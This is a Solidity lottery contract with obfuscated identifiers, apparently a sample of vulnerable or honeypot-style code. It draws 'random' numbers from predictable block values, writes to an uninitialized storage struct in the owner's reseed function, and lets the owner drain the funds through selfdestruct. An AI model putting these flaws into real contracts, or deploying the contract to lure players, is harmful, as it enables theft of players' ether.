contract OpenAddressLottery{
    struct SeedComponents{
        uint _0x859ed6;
        uint _0xe940eb;
        uint _0x14d865;
        uint _0x0d0f95;
    }

    address _0xc540ca; //address of the owner
    uint private _0x2259e9; //seed used to calculate number of an address
    uint private _0x359606; //last reseed - used to automatically reseed the contract every 1000 blocks
    uint LuckyNumber = 7; //if the number of an address equals 7, it wins

    mapping (address => bool) _0x89c217; //keeping track of addresses that have already won

    function OpenAddressLottery() {
        _0xc540ca = msg.sender;
        _0x444620(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp)); //generate a quality random seed
    }

    function _0xb3378f() payable {
        if(msg.value<0.1 ether)
            return; //verify ticket price

        // make sure he hasn't won already
        require(_0x89c217[msg.sender] == false);

        if(_0x93ec53(msg.sender) == LuckyNumber){ //check if it equals 7
            _0x89c217[msg.sender] = true; // every address can only win once

            uint _0x904366=msg.value*7; //win = 7 times the ticket price

            if(_0x904366>this.balance) //if the balance isnt sufficient...
                _0x904366=this.balance; //...send everything we've got
            msg.sender.transfer(_0x904366);
        }

        if(block.number-_0x359606>1000) //reseed if needed
            _0x444620(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp)); //generate a quality random seed
    }

    function _0x93ec53(address _0x2200cf) constant returns(uint n){
        // calculate the number of current address - 1 in 8 chance
        n = uint(_0x0250bc(uint(_0x2200cf), _0x2259e9)[0]) % 8;
    }

    function _0x444620(SeedComponents _0x86d193) internal {
        _0x2259e9 = uint256(_0x0250bc(
            _0x86d193._0x859ed6,
            _0x86d193._0xe940eb,
            _0x86d193._0x14d865,
            _0x86d193._0x0d0f95
        )); //hash the incoming parameters and use the hash to (re)initialize the seed
        _0x359606 = block.number;
    }

    function _0x4ee0ae() {
        require(msg.sender==_0xc540ca);

        selfdestruct(msg.sender);
    }

    function _0x2001f9() { //reseed initiated by the owner - for testing purposes
        require(msg.sender==_0xc540ca);

        SeedComponents s;
        s._0x859ed6 = uint(msg.sender);
        s._0xe940eb = uint256(block.blockhash(block.number - 1));
        s._0x14d865 = block.difficulty*(uint)(block.coinbase);
        s._0x0d0f95 = tx.gasprice * 7;

        _0x444620(s); //reseed
    }

    function () payable { //if someone sends money without any function call, just assume he wanted to participate
        if(msg.value>=0.1 ether && msg.sender!=_0xc540ca) //owner can't participate, he can only fund the jackpot
            _0xb3378f();
    }

}
